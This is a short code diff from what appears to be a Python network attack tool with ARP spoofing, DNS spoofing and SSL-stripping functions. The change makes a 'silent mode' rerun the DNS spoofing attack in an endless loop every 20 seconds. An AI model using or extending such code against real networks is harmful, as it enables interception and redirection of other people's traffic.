@@ -32,7 +32,7 @@ def ARP_spoofing():
 
 # DNS-Spoof Attack
 def dns_spoof_attack():
-    packets = sniff(filter='udp port 53', count=10, prn=process_packet)
+    packets = sniff(filter='udp port 53', count=8, prn=process_packet)
     # for packet in packets:
     #     if packet.haslayer(DNS):
     #         dns_packet = packet[DNS]
@@ -104,9 +104,9 @@ def ssl_strip_attack():
 
 def silent_mode():
     try:
-        # while True:
-        #     ARP
-        dns_spoof_attack()
+        while True:
+            dns_spoof_attack()
+            time.sleep(20)
     except KeyboardInterrupt:
         pass
 
